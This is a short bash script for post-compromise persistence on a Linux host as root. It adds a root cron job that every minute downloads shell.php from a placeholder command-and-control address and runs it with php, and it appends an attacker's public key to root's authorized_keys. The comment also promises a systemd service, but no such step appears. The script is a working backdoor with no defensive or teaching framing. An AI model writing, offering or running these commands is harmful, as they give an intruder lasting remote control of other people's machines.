#!/bin/bash
# Add cronjob + SSH key + systemd service
echo "* * * * * curl -s http://YOUR_C2/shell.php | php" >> /var/spool/cron/root
mkdir -p /root/.ssh && echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys